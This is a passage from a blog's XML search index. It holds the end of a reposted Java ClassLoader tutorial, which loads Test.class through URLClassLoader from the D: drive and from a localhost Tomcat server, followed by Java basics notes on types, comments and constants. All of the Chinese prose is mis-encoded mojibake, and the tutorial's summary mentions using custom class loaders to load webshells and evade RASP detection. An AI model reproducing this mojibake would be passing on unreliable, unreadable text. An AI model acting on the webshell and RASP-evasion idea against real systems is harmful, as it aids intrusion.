punctuation">;</span>        <span class="token punctuation">&#125;</span>         <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ç„¶åä½¿ç”¨javacè¿›è¡Œç¼–è¯‘ï¼Œåœ¨Dç›˜ç”Ÿæˆå¯¹åº”çš„classæ–‡ä»¶ã€‚</p><p><img src="12.png" loading="lazy"></p><p>ä¹‹åæˆ‘ä»¬å†ä¿®æ”¹ClassLoaderTestç±»ï¼Œåˆ©ç”¨URLClassLoaderæ–¹å¼å»è·å–Dç›˜ä¸­Test.classæ–‡ä»¶ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span></span><span class="token class-name">Classloader</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">File</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URI</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URL</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLClassLoader</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ClassLoaderTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">File</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"d:/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">URI</span> uri <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">toURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">URL</span> url <span class="token operator">=</span> uri<span class="token punctuation">.</span><span class="token function">toURL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">URLClassLoader</span> classLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLClassLoader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> classLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"com.test.Test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        clazz<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>è¿™é‡Œä½¿ç”¨Fileè·å–ç±»æ–‡ä»¶è·¯å¾„ï¼Œä¹‹åä½¿ç”¨URLClassLoaderè·å–urlåœ°å€ä¸ºDç›˜ï¼Œä¹‹åä½¿ç”¨loadClassæ–¹æ³•è·å–Test.classæ‰€å«åŒ…åï¼Œç„¶åå®ä¾‹åŒ–ã€‚è¿è¡Œå‘ç°è§£æè·å–åˆ°äº†Dç›˜ä¸­Test.classæ–‡ä»¶ã€‚</p><p><img src="13.png" loading="lazy"></p><h3 id="2-ç½‘ç»œä¼ è¾“classæ–‡ä»¶è°ƒç”¨"><a href="#2-ç½‘ç»œä¼ è¾“classæ–‡ä»¶è°ƒç”¨" class="headerlink" title="2. ç½‘ç»œä¼ è¾“classæ–‡ä»¶è°ƒç”¨"></a>2. ç½‘ç»œä¼ è¾“classæ–‡ä»¶è°ƒç”¨</h3><p>ä¹‹åæˆ‘ä»¬å°†Test.classæ”¾ç½®åˆ°ç”µè„‘çš„TomcatæœåŠ¡å™¨ç›®å½•ä¸‹ï¼Œç„¶åå¯åŠ¨Tomcatã€‚ä¹‹åæ–°å»ºä¸ªClassLoaderDemoç±»ç½‘ç»œåŠ è½½TomcatæœåŠ¡å™¨ä¸­çš„Test.class.</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span></span><span class="token class-name">Classloader</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URL</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLClassLoader</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ClassLoaderDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">URL</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"http://localhost:8080/examples/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">URLClassLoader</span> classLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLClassLoader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> classLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"com.test.Test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        clazz<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>è¿™é‡Œä½¿ç”¨URLClassLoaderåŠ è½½ç½‘ç»œä¸­çš„TomcatæœåŠ¡å™¨ç›®å½•ï¼ŒæˆåŠŸè§£æè·å–åˆ°äº†ç›®å½•ä¸‹çš„Test.classæ–‡ä»¶ã€‚</p><p><img src="14.png" loading="lazy"></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>é€šè¿‡ClassLoaderç±»çš„å­¦ä¹ ï¼Œæˆ‘ä»¬çŸ¥é“ä¸ä»…ä»…å±€é™äºåœ¨ClassPathä¸­ç±»çš„è°ƒç”¨ï¼Œè¿˜èƒ½å¤Ÿé€šè¿‡è‡ªå®šä¹‰CLassLoaderç±»æ¥åŠ è½½æˆ‘ä»¬ç‰¹å®šçš„ç±»æ¥æ“ä½œåˆ©ç”¨ã€‚åœ¨å®‰å…¨é¢†åŸŸå½“ä¸­ï¼Œæˆ‘ä»¬å¾€å¾€ä¼šä½¿ç”¨å…¶ClassLoaderç‰¹æ€§ï¼Œè‡ªå®šä¹‰æ¶æ„çš„ç±»åŠ è½½webshellåˆ©ç”¨ä»¥åŠè‡ªå®šä»¥ç±»å­—èŠ‚ç çš„nativeæ–¹æ³•ç»•è¿‡RASPæ£€æµ‹ã€‚æ‰€ä»¥äº†è§£ClassLoaderç‰¹æ€§å¹¶è¿›è¡Œè‡ªå®šä¹‰ç¼–å†™ï¼Œå¯¹æˆ‘ä»¬äº†è§£javaå®‰å…¨æœºåˆ¶ååˆ†é‡è¦ã€‚</p><p>è½¬è½½å¤§ä½¬æ–‡ç« </p><p><a href="https://xz.aliyun.com/t/9002?accounttraceid=1182a6e93e8242f58d4e872678042864ieed#toc-3">JAVAå®‰å…¨åŸºç¡€ï¼ˆä¸€ï¼‰â€“ç±»åŠ è½½å™¨ï¼ˆClassLoaderï¼‰ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaåŸºç¡€å­¦ä¹ ç¬”è®°</title>
      <link href="/2024/08/31/Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/08/31/Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p><strong>çº¸ä¸Šå¾—æ¥ç»ˆè§‰æµ…,ç»çŸ¥æ­¤äº‹è¦èº¬è¡Œã€‚</strong></p><p><a href="https://aigz8jy30yo.feishu.cn/docx/EkhJdSJZPo5L22xSujzcdqvVnjf">Javaå…¥é—¨æ•™ç¨‹-ä¸Š</a></p><p><a href="https://aigz8jy30yo.feishu.cn/docx/HKzhdYw84oXiY6x9hVhcEMT8nXg">Javaå…¥é—¨æ•™ç¨‹-ä¸‹</a></p><p><a href="https://aigz8jy30yo.feishu.cn/docx/BtbOd3c5aotnpdxYTVDcnqQanxd">Java Webå¼€å‘æ•™ç¨‹</a></p><p>(æ„Ÿè°¢å¥½æœ‹å‹çš„åˆ†äº«)</p><p><a href="https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%9F%BA%E7%A1%80/Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89.md">CTF-JavaåŸºç¡€</a></p><p><a href="https://www.cainiaojc.com/java/java-reflection.html">Java åå°„(Reflection)</a></p><h3 id="Javaç¨‹åºè®¾è®¡ç¯å¢ƒ"><a href="#Javaç¨‹åºè®¾è®¡ç¯å¢ƒ" class="headerlink" title="Javaç¨‹åºè®¾è®¡ç¯å¢ƒ"></a>Javaç¨‹åºè®¾è®¡ç¯å¢ƒ</h3><ul><li>JDKï¼šç¼–å†™Javaç¨‹åºçš„ç¨‹åºå‘˜ä½¿ç”¨çš„è½¯ä»¶ã€‚</li><li>SEï¼šç”¨äºæ¡Œé¢æˆ–ç®€å•æœåŠ¡å™¨åº”ç”¨çš„Javaå¹³å°ã€‚</li><li>OpenJDKï¼šJava SEçš„ä¸€ä¸ªå…è´¹å¼€æºå®ç°ã€‚</li></ul><p>JDKå®‰è£…ç›®å½•ä»‹ç»</p><table><thead><tr><th><strong>ç›®å½•åç§°</strong></th><th><strong>è¯´æ˜</strong></th></tr></thead><tbody><tr><td>bin</td><td>è¯¥è·¯å¾„ä¸‹å­˜æ”¾äº†JDKçš„å„ç§å·¥å…·å‘½ä»¤ã€‚javacå’Œjavaå°±æ”¾åœ¨è¿™ä¸ªç›®å½•ã€‚</td></tr><tr><td>conf</td><td>è¯¥è·¯å¾„ä¸‹å­˜æ”¾äº†JDKçš„ç›¸å…³é…ç½®æ–‡ä»¶ã€‚</td></tr><tr><td>include</td><td>è¯¥è·¯å¾„ä¸‹å­˜æ”¾äº†ä¸€äº›å¹³å°ç‰¹å®šçš„å¤´æ–‡ä»¶ã€‚</td></tr><tr><td>jmods</td><td>è¯¥è·¯å¾„ä¸‹å­˜æ”¾äº†JDKçš„å„ç§æ¨¡å—ã€‚</td></tr><tr><td>legal</td><td>è¯¥è·¯å¾„ä¸‹å­˜æ”¾äº†JDKå„æ¨¡å—çš„æˆæƒæ–‡æ¡£ã€‚</td></tr><tr><td>lib</td><td>è¯¥è·¯å¾„ä¸‹å­˜æ”¾äº†JDKå·¥å…·çš„ä¸€äº›è¡¥å……JARåŒ…ã€‚</td></tr></tbody></table><p>JVMï¼ˆJava Virtual Machineï¼‰ï¼ŒJavaè™šæ‹Ÿæœº</p><p>JREï¼ˆJava Runtime Environmentï¼‰ï¼ŒJavaè¿è¡Œç¯å¢ƒï¼ŒåŒ…å«äº†JVMå’ŒJavaçš„æ ¸å¿ƒç±»åº“ï¼ˆJava APIï¼‰</p><p>JDKï¼ˆJava Development Kitï¼‰ç§°ä¸ºJavaå¼€å‘å·¥å…·ï¼ŒåŒ…å«äº†JREå’Œå¼€å‘å·¥å…·</p><h3 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloWorld</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"HelloWorld"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ç”¨åˆ°ä¸¤ä¸ªå‘½ä»¤ï¼š</p><pre class="language-java" data-language="java"><code class="language-java">javac <span class="token operator">+</span> æ–‡ä»¶å <span class="token operator">+</span> åç¼€å ï¼ˆå°±æ˜¯ç¼–è¯‘javaæ–‡ä»¶ï¼‰java <span class="token operator">+</span> æ–‡ä»¶åï¼ˆè¿è¡Œç¼–è¯‘ä¹‹åçš„<span class="token keyword">class</span>æ–‡ä»¶ï¼‰</code></pre><h4 id="ä¸€äº›æ³¨æ„ç‚¹"><a href="#ä¸€äº›æ³¨æ„ç‚¹" class="headerlink" title="ä¸€äº›æ³¨æ„ç‚¹"></a>ä¸€äº›æ³¨æ„ç‚¹</h4><ul><li><p>Javaä»£ç ä¸­ï¼Œæ˜¯ä¸¥æ ¼åŒºåˆ†å¤§å°å†™çš„ï¼ˆæ¯”å¦‚Systemï¼‰</p></li><li><p>ç±»æ˜¯æ„å»ºæ‰€æœ‰Javaåº”ç”¨ç¨‹åºå’Œapplletçš„æ„å»ºå—ï¼ŒJavaåº”ç”¨ç¨‹åºä¸­çš„å…¨éƒ¨å†…å®¹éƒ½å¿…é¡»æ”¾ç½®åœ¨ç±»ä¸­ã€‚</p></li><li><p>ç±»åå¿…é¡»ä»¥å­—æ¯å¼€å¤´ã€‚ä¸”å‘½åè§„èŒƒæ˜¯éª†é©¼å‘½åæ³•ã€‚</p></li><li><blockquote><p><strong>é©¼å³°å‘½ä»¤æ³•(Camel)</strong></p><p>ä¹Ÿç§°éª†é©¼å¼å‘½åæ³•æ­£å¦‚å®ƒçš„åç§°æ‰€è¡¨ç¤ºçš„é‚£æ ·ï¼Œæ˜¯æŒ‡æ··åˆä½¿ç”¨å¤§å°å†™å­—æ¯æ¥æ„æˆå˜é‡å’Œå‡½æ•°çš„åå­—ä¾‹å¦‚ï¼Œä¸‹é¢æ˜¯åˆ†åˆ«ç”¨éª†é©¼å¼å‘½åæ³•å’Œä¸‹åˆ’çº¿æ³•å‘½åçš„åŒä¸€ä¸ªå‡½æ•°ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token function">printEmployeePaychecks</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼›<span class="token function">print_employee_paychecks</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼›</code></pre><p>ç¬¬ä¸€ä¸ªå‡½æ•°åä½¿ç”¨äº†éª†é©¼å¼å‘½åæ³•ï¼Œå‡½æ•°åä¸­çš„æ¯ä¸€ä¸ªé€»è¾‘æ–­ç‚¹éƒ½æœ‰ä¸€ä¸ªå¤§å†™å­—æ¯æ¥æ ‡è®°ï¼›ç¬¬äºŒä¸ªå‡½æ•°åä½¿ç”¨äº†ä¸‹åˆ’çº¿æ³•ï¼Œå‡½æ•°åä¸­çš„æ¯ä¸€ä¸ªé€»è¾‘æ–­ç‚¹éƒ½æœ‰ä¸€ä¸ªä¸‹åˆ’çº¿æ¥æ ‡è®°</p></blockquote></li><li><p>æºä»£ç çš„æ–‡ä»¶åå¿…é¡»ä¸å…¬å…±ç±»çš„åå­—ç›¸åŒï¼Œå¹¶ç”¨.javaä½œä¸ºæ‹“å±•åã€‚</p></li><li><p>è¿è¡Œå·²ç¼–è¯‘çš„ç¨‹åºæ—¶ï¼ŒJavaè™šæ‹Ÿæœºæ€»æ˜¯ä»æŒ‡å®šç±»çš„mainæ–¹æ³•å¼€å§‹æ‰§è¡Œã€‚ä¸”mainæ–¹æ³•å¿…é¡»å£°æ˜ä¸ºpublicï¼Œä¸”å¿…é¡»æ˜¯é™æ€çš„(static)ã€‚</p></li></ul><h3 id="JavaåŸºç¡€è¯­æ³•"><a href="#JavaåŸºç¡€è¯­æ³•" class="headerlink" title="JavaåŸºç¡€è¯­æ³•"></a>JavaåŸºç¡€è¯­æ³•</h3><h4 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h4><p>Javaä¸­çš„æ³¨é‡Šåˆ†ä¸ºä¸‰ç§ï¼š</p><ul><li>å•è¡Œæ³¨é‡Šï¼š</li></ul><pre class="language-Java" data-language="Java"><code class="language-Java">&#x2F;&#x2F; è¿™æ˜¯å•è¡Œæ³¨é‡Šæ–‡å­—</code></pre><ul><li>å¤šè¡Œæ³¨é‡Šï¼š</li></ul><pre class="language-Java" data-language="Java"><code class="language-Java">&#x2F;*è¿™æ˜¯å¤šè¡Œæ³¨é‡Šæ–‡å­—è¿™æ˜¯å¤šè¡Œæ³¨é‡Šæ–‡å­—è¿™æ˜¯å¤šè¡Œæ³¨é‡Šæ–‡å­—*&#x2F;</code></pre><p>æ³¨æ„ï¼šå¤šè¡Œæ³¨é‡Šä¸èƒ½åµŒå¥—ä½¿ç”¨ã€‚</p><ul><li>æ–‡æ¡£æ³¨é‡Šï¼ˆæš‚æ—¶ç”¨ä¸åˆ°ï¼‰ï¼š</li></ul><pre class="language-Java" data-language="Java"><code class="language-Java">&#x2F;**è¿™æ˜¯å¤šè¡Œæ³¨é‡Šæ–‡å­—è¿™æ˜¯å¤šè¡Œæ³¨é‡Šæ–‡å­—è¿™æ˜¯å¤šè¡Œæ³¨é‡Šæ–‡å­—*&#x2F;</code></pre><p><strong>ä½¿ç”¨çš„æŠ€å·§</strong></p><ol><li>å¦‚æœæˆ‘ä»¬è¦å¯¹ä»£ç è¿›è¡Œè§£é‡Šï¼Œé‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨æ³¨é‡Šã€‚</li><li>å½“æ³¨é‡Šçš„å†…å®¹æ¯”è¾ƒå°‘ï¼Œä¸€è¡Œå°±å†™å®Œäº†ï¼Œå¯ä»¥ç”¨å•è¡Œæ³¨é‡Šã€‚</li><li>å¦‚æœæ³¨é‡Šçš„å†…å®¹æ¯”è¾ƒå¤šï¼Œéœ€è¦å†™åœ¨å¤šè¡Œï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨å¤šè¡Œæ³¨é‡Šã€‚</li></ol><p><strong>æ³¨æ„ï¼š</strong>æ³¨é‡Šçš„å†…å®¹ä¸ä¼šå‚ä¸ç¼–è¯‘å’Œè¿è¡Œçš„ï¼Œä»…ä»…æ˜¯å¯¹ä»£ç çš„è§£é‡Šè¯´æ˜è€Œå·²ã€‚æ‰€ä»¥ï¼Œä¸ç®¡åœ¨æ³¨é‡Šå½“ä¸­å†™ä»€ä¹ˆå†…å®¹ï¼Œéƒ½ä¸ä¼šå½±å“ä»£ç è¿è¡Œçš„ç»“æœã€‚</p><h4 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h4><p>Javaæ˜¯å¼ºç±»å‹è¯­è¨€ï¼Œå¿…é¡»ä¸ºå˜é‡å£°æ˜ç±»å‹ã€‚Javaä¸­ä¸€å…±å…«ç§åŸºæœ¬ç±»å‹ï¼Œ4ç§æ•´å½¢ï¼Œ2ç§æµ®ç‚¹ç±»å‹ï¼Œ1ç§å­—ç¬¦ä¸²ç±»å‹charå’Œbooleanç±»å‹ã€‚</p><p><strong>æ•´å½¢</strong>ï¼šint,short,long,byteã€‚</p><p>Javaä¸­æ•´å½¢çš„èŒƒå›´ä¸è¿è¡ŒJavaä»£ç çš„æœºå™¨æ— å…³ã€‚</p><ul><li>longï¼š<code>400000L</code></li><li>åå…­è¿›åˆ¶ï¼š<code>0xCA</code></li><li>å…«è¿›åˆ¶ï¼š<code>010</code></li><li>äºŒè¿›åˆ¶ï¼š<code>0b1001</code></li></ul><p>Javaæ²¡æœ‰ä»»ä½•æ— ç¬¦å·å½¢å¼çš„æ•´å½¢ç±»å‹ã€‚</p><p><strong>æµ®ç‚¹</strong>ï¼šfloat double</p><p>æ²¡æœ‰åç¼€Fçš„æµ®ç‚¹æ•°å€¼æ€»æ˜¯é»˜è®¤ä¸ºdoubleç±»å‹ã€‚å½“ç„¶ä¹Ÿå¯ä»¥åœ¨æœ€åæ·»åŠ åç¼€Dæˆ–dã€‚</p><p>æµ®ç‚¹æ•°å€¼ä¸é€‚åˆäºæ— æ³•æ¥å—èˆå…¥è¯¯å·®çš„é‡‘èè®¡ç®—ã€‚å¦‚æœåœ¨æ•°å€¼è®¡ç®—ä¸­ä¸å…è®¸æœ‰ä»»ä½•èˆå…¥è¯¯å·®ï¼Œå°±åº”è¯¥ä½¿ç”¨BigDecimalç±»ã€‚</p><p><strong>charç±»å‹</strong></p><p>charç±»å‹åŸæœ¬ç”¨äºè¡¨ç¤ºå•ä¸ªå­—ç¬¦ï¼Œä¸è¿‡ç°åœ¨å¦‚ä»Šæœ‰äº›Unicodeå­—ç¬¦å¯ä»¥ç”¨ä¸€ä¸ªcharå€¼æè¿°ï¼Œå¦å¤–ä¸€äº›unicodeå­—ç¬¦åˆ™éœ€è¦2ä¸ªcharå€¼ã€‚</p><p>charç±»å‹çš„å­—é¢é‡è¦ç”¨å•å¼•å·æ‹¬èµ·æ¥ï¼Œä¾‹å¦‚â€™Aâ€™æ˜¯ç¼–ç å€¼ä¸º65çš„å­—ç¬¦å¸¸é‡ã€‚</p><p>charç±»å‹çš„å€¼å¯ä»¥è¡¨ç¤ºä¸ºåå…­è¿›åˆ¶ï¼Œä»\u0000åˆ°\uffffã€‚</p><p>è½¬ä¹‰åºåˆ—\uè¿˜å¯ä»¥å‡ºç°åœ¨åŠ å¼•å·çš„å­—ç¬¦å¸¸é‡æˆ–å­—ç¬¦ä¸²ä¹‹å¤–ï¼Œè€Œå…¶ä»–çš„æ‰€æœ‰è½¬ä¹‰åºåˆ—éƒ½ä¸è¡Œï¼Œä¾‹å¦‚ï¼š</p><pre class="language-none"><code class="language-none">public static void main(String\u005B\u005D args)&#96;ï¼Œæ˜¯&#96;[]</code></pre><p>Unicodeè½¬ä¹‰åºåˆ—ä¼šåœ¨è§£æä»£ç ä¹‹å‰å¾—åˆ°å¤„ç†ï¼Œä¾‹å¦‚ï¼š</p><pre class="language-none"><code class="language-none">&quot;\u0022+\u0022&quot;&#96;æ˜¯&#96;&quot;&quot;+&quot;&quot;</code></pre><p>å¼ºçƒˆå»ºè®®ä¸è¦åœ¨ç¨‹åºä¸­ä½¿ç”¨charç±»å‹ï¼Œæœ€å¥½å°†å­—ç¬¦ä¸²ä½œä¸ºæŠ½è±¡æ•°æ®ç±»å‹ä½¿ç”¨ã€‚</p><p><strong>boolean</strong>ç±»å‹</p><p>falseå’Œtrueã€‚<strong>æ•´å‹å€¼å’Œå¸ƒå°”å€¼ä¹‹é—´ä¸èƒ½è¿›è¡Œç›¸äº’è½¬æ¢</strong></p><p><strong>å˜é‡ä¸å¸¸é‡</strong></p><p>Javaä¸­çš„æ•°å­—å’Œå­—æ¯èŒƒå›´æ›´å¤§ã€‚</p><p>å£°æ˜ä¸€ä¸ªå˜é‡ä¹‹åï¼Œå¿…é¡»ç”¨èµ‹å€¼è¯­å¥å¯¹å˜é‡è¿›è¡Œ<strong>æ˜¾å¼</strong>åˆå§‹åŒ–ï¼Œåƒä¸‡ä¸è¦ä½¿ç”¨æœªåˆå§‹åŒ–çš„å˜é‡çš„å€¼ã€‚</p><p>Javaä¸­å¯ä»¥å°†å£°æ˜æ”¾åœ¨ä»£ç ä¸­çš„ä»»ä½•åœ°æ–¹ã€‚ä½†æ˜¯å˜é‡çš„å£°æ˜å°½å¯èƒ½åœ°é è¿‘å˜é‡ç¬¬ä¸€æ¬¡ä½¿ç”¨çš„åœ°æ–¹ï¼Œè¿™æ˜¯ä¸€ç§è‰¯å¥½çš„ç¨‹åºç¼–å†™é£æ ¼ã€‚</p><p><strong>ä»Java10å¼€å§‹ï¼Œå¯¹äºå±€éƒ¨å˜é‡ï¼Œå¦‚æœå¯ä»¥ä»å˜é‡çš„åˆå§‹å€¼æ¨æ–­å‡ºå®ƒçš„ç±»å‹ï¼Œå°±ä¸å†éœ€è¦å£°æ˜ç±»å‹ï¼Œåªéœ€è¦ä½¿ç”¨å…³é”®å­—varè€Œæ— éœ€æŒ‡å®šç±»å‹</strong></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">var</span> feng <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">;</span><span class="token keyword">var</span> fff <span class="token operator">=</span> <span class="token string">"feng"</span><span class="token punctuation">;</span></code></pre><p>ç”¨finalæŒ‡ç¤ºå¸¸é‡ã€‚finalè¡¨ç¤ºè¿™ä¸ªå¸¸é‡åªèƒ½è¢«èµ‹å€¼ä¸€æ¬¡ã€‚å¸¸é‡åä½¿ç”¨å…¨å¤§å†™ã€‚</p><p>å¦‚æœä¸€ä¸ªå¸¸é‡åœ¨ç±»çš„å¤šä¸ªæ–¹æ³•ä¸­è¢«ä½¿ç”¨ï¼Œé€šå¸¸å°†å…¶è®¾ç½®æˆç±»å¸¸é‡ï¼Œç”¨<code>static final</code>ã€‚ä¸”ç±»å¸¸é‡çš„å®šä¹‰æ”¾åœ¨mainæ–¹æ³•çš„å¤–éƒ¨</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span><span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">double</span> <span class="token constant">PI</span> <span class="token operator">=</span> <span class="token number">3.14</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token constant">PI</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>å¦‚æœä¸€ä¸ªå¸¸é‡è¢«å£°æ˜ä¸º<code>public</code>ï¼Œé‚£ä¹ˆå…¶ä»–ç±»çš„æ–¹æ³•ä¹Ÿå¯ä»¥ä½¿ç”¨è¿™ä¸ªå¸¸é‡ã€‚</p><p><strong>æšä¸¾</strong></p><p>æšä¸¾ç±»å‹åŒ…æ‹¬æœ‰é™ä¸ªå‘½åçš„å€¼ã€‚</p><p>å½“å‚ä¸<code>/</code>è¿ç®—çš„ä¸¤ä¸ªæ“ä½œæ•°éƒ½æ˜¯æ•´æ•°æ—¶ï¼Œè¡¨ç¤ºæ•´æ•°é™¤æ³•ï¼Œå¦åˆ™è¡¨ç¤ºæµ®ç‚¹é™¤æ³•ã€‚</p><p>æ•´æ•°è¢«0é™¤ä¼šäº§ç”Ÿä¸€ä¸ªå¼‚å¸¸ï¼Œè€Œæµ®ç‚¹æ•°è¢«0é™¤å°†ä¼šå¾—åˆ°æ— ç©·å¤§æˆ–NANç»“æœã€‚</p><p>Mathç±»åŒ…å«äº†å„ç§å„æ ·çš„æ•°å­¦å‡½æ•°ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">double</span> x <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token keyword">double</span> y <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">sqrt</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Javaæ²¡æœ‰å¹‚è¿ç®—ï¼Œéœ€è¦ç»“æœMath.powæ–¹æ³•ï¼š<code>double y = 